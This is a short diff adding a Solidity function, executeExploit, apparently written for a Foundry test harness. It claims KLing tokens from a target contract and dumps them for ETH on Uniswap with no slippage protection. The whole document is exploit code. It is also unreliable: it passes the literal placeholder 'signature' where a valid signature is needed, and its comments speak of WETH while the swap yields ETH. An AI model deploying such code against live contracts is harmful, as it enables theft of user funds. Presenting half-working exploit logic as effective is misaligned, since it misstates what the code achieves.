@@ -1,0 +1,41 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Start a prank as if we are the user to invoke the claim
+    vm.startPrank(address(this), address(this));
+
+    // Fetch the signer address again and check if we can claim tokens
+    // We assume that we will be getting tokens successfully, thus obtaining sufficient WETH.
+    bytes memory params = abi.encode(
+        "signature", // placeholder, use valid signature obtained through off-chain signing process
+        address(this),
+        100e18, // amount of KLing we will claim
+        0, // slot
+        block.timestamp + 1 days // valid for one day
+    );
+
+    IKLingToken(target).claim(params); // Claim the tokens
+
+    // Now, swap the claimed tokens back to WETH on Uniswap via the router
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken);
+    path[1] = uniswapRouter.WETH();
+
+    uint256 tokenBalance = valuableToken.balanceOf(address(this));
+    
+    // Assuming we are able to convert the tokens to at least 95% of WETH when swapped
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+        tokenBalance,
+        0, // amountOutMin is set to 0 to allow for the potential slippage
+        path,
+        address(this),
+        block.timestamp + 1 days
+    );
+
+    // Stop the prank
+    vm.stopPrank();
+
+    // At this point, the address(this) should hold more WETH than originally present if the exploit is successful
+}
+</executeExploitCode>
+```
